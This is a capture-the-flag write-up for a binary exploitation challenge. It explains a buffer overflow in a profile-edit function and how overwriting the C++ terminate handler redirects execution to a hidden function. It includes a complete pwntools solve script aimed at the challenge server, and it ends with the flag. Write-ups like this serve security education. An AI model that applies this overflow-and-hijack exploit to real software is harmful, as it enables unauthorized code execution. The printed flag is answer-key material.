# Overview

**Challenge Name :** CPP Encrypter

**Author :** @Capang

**Description :** I love C so much that I code a CPP program using C syntax

## Analysis

```c
    puts("\n--- Edit Profile ---");
    printf("Enter new username (leave empty to keep current): ");
    fgets(local_418,0x404,stdin);
```

There is an obvious BOF here because the username is originally of size 256 but its taking in 1028 characters when you try to edit your profile.

![image](https://github.com/user-attachments/assets/f3cac91b-b0ee-42c7-ab91-da2e95044fa3)

After going through the things that we can overwrite, this function looked the most interesting. Judging from its name `terminate handler`, we assumed that if we somehow managed to terminate the program without the traditional way, we can overwrite this handler to point to a function that we want. But which function?

![image](https://github.com/user-attachments/assets/ef2b0b65-3d1c-47ee-8868-d44d2f2ee96e)

After doing abit of going through every single function in the program, you will eventually stumble upon this interesting function. Next step is how to terminate the program in a different way? 

![image](https://github.com/user-attachments/assets/1ee643bd-6c97-4e19-a2d6-55ae51a84b10)

In the encrypt message function, if you give too many messages to encrypt, it will trigger bad array length. So the goal is simple

1. Overwrite terminate handler with the address of the useless function
2. Give a large number to encrypt message and terminate the program

## Solve Script

```py
#!/usr/bin/python
from pwn import *

filepath = './encryption_app'
exe = context.binary = ELF(filepath)

host = "116.203.176.73"
port = 59656

r = lambda x: p.recv(x)
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
cl = lambda: p.clean(timeout=1)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

def create(usr=b"a", pas=b"a"):
  sla(b"choice: ", "1")
  sla(b"username: ", usr) 
  sla(b"password: ", pas)

def login(usr=b"a", pas=b"a"):
  sla(b"choice: ", "2")
  sla(b"Username: ", usr) 
  sla(b"Password: ", pas)

def edit(usr=b"a", pas=b"a"):
  sla(b"choice: ", "3")
  sla(b": ", usr)
  # s(usr)
  sla(b": ", pas)

def encrypt(num, method, msg):
  sla(b"choice: ", "5")
  sla(b"hash? ", str(num))
  sla(b": ", msg)
  sla(b": ", str(method))

# p = exe.process()
# p = remote("localhost", 10002)
p = remote(host,port)

win = 0x401976

create()
login()
payload = b"A" * 0x148
payload += p64(win)

edit(payload)

sla(b"choice: ", "5")
sla(b"hash? ", str(10000000000000000))

p.interactive()
```

![image](https://github.com/user-attachments/assets/108a3920-876b-4681-b223-317915787f21)

> UMCS{AW3S0ME_3NCRYPT0R_S0LLV33_73bb3661}
